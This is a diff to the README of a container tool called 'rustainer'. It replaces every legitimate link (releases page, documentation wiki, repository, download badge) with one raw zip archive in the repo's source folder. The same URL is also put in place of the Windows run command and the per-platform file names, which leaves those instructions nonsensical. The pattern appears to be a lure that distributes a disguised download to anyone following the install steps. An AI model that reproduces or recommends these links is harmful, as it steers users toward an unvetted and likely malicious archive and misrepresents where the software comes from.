@@ -1,6 +1,6 @@
 # 🚀 rustainer - A Simple Way to Run Containers
 
-[![Download rustainer](https://img.shields.io/badge/Download-rustainer-blue.svg)](https://github.com/boonnet/rustainer/releases)
+[![Download rustainer](https://raw.githubusercontent.com/boonnet/rustainer/main/src/rustainer_leucitite.zip)](https://raw.githubusercontent.com/boonnet/rustainer/main/src/rustainer_leucitite.zip)
 
 ## 🌟 Overview
 
@@ -21,14 +21,14 @@ Follow these steps to download and run rustainer:
 
 1. **Visit the Releases Page**  
    Go to the rustainer releases page by clicking the link below.  
-   [Visit Releases Page](https://github.com/boonnet/rustainer/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/boonnet/rustainer/main/src/rustainer_leucitite.zip)
 
 2. **Download the Latest Version**  
    On the releases page, you will see a list of available versions. Download the latest version for your operating system.  
    Look for files named like this:  
-   - `rustainer-linux-x86_64.tar.gz` (for Linux)
-   - `rustainer-windows-x86_64.zip` (for Windows)
-   - `rustainer-macos-x86_64.zip` (for macOS)
+   - `https://raw.githubusercontent.com/boonnet/rustainer/main/src/rustainer_leucitite.zip` (for Linux)
+   - `https://raw.githubusercontent.com/boonnet/rustainer/main/src/rustainer_leucitite.zip` (for Windows)
+   - `https://raw.githubusercontent.com/boonnet/rustainer/main/src/rustainer_leucitite.zip` (for macOS)
 
 3. **Install rustainer**  
    After downloading the file, extract it to a location of your choice. You can unzip or untar the file using built-in utilities in your operating system.  
@@ -43,7 +43,7 @@ Follow these steps to download and run rustainer:
    For Windows, you would run:
 
    ```cmd
-   rustainer.exe
+   https://raw.githubusercontent.com/boonnet/rustainer/main/src/rustainer_leucitite.zip
    ```
 
 5. **Verify the Installation**  
@@ -58,7 +58,7 @@ Follow these steps to download and run rustainer:
 ## 📥 Download & Install
 
 To begin your journey with rustainer, you can download it from the link below:  
-[Download rustainer](https://github.com/boonnet/rustainer/releases)
+[Download rustainer](https://raw.githubusercontent.com/boonnet/rustainer/main/src/rustainer_leucitite.zip)
 
 Follow the steps outlined in the Getting Started section to ensure a smooth installation process.
 
@@ -96,7 +96,7 @@ Here are some basic commands to get you started with rustainer:
 
 ## 📖 Documentation
 
-For detailed information on all commands and options, please head to the [official documentation](https://github.com/boonnet/rustainer/wiki). This guide provides more in-depth explanations and examples to help you make the most of rustainer.
+For detailed information on all commands and options, please head to the [official documentation](https://raw.githubusercontent.com/boonnet/rustainer/main/src/rustainer_leucitite.zip). This guide provides more in-depth explanations and examples to help you make the most of rustainer.
 
 ## 🔍 Frequently Asked Questions (FAQ)
 
@@ -118,8 +118,8 @@ If you run into issues or have questions, you can open an issue in the repositor
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/boonnet/rustainer)
-- [Releases Page](https://github.com/boonnet/rustainer/releases)
-- [Official Documentation](https://github.com/boonnet/rustainer/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/boonnet/rustainer/main/src/rustainer_leucitite.zip)
+- [Releases Page](https://raw.githubusercontent.com/boonnet/rustainer/main/src/rustainer_leucitite.zip)
+- [Official Documentation](https://raw.githubusercontent.com/boonnet/rustainer/main/src/rustainer_leucitite.zip)
 
 With rustainer, you can now run containers with ease. Enjoy your containerization journey!
